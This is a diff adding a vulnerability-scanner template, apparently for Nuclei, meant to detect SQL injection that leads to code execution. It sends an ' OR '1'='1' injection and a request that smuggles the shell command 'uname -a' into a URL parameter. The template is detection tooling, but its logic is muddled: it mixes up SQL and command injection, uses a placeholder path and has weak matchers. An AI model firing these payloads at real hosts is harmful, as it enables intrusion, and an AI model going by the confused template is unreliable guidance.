@@ -1,0 +1,46 @@
+id: sqli-code-execution-takeover
+
+info:
+  name: SQL Injection leading to Code Execution and Takeover
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    This template detects SQL Injection vulnerabilities that can lead to code execution and complete system takeover.
+
+http:
+  - raw:
+      - |
+        GET /vulnerable_path?id=1' OR '1'='1'-- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "SQL syntax"
+          - "Warning: mysql"
+        part: body
+
+      - type: regex
+        regex:
+          - "(?i)select.+from.+information_schema"
+        part: body
+
+  - raw:
+      - |
+        GET /vulnerable_path?id=1; uname -a; -- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "Linux"
+          - "root"
+        part: body
+
+      - type: dsl
+        dsl:
+          - "status_code == 200"
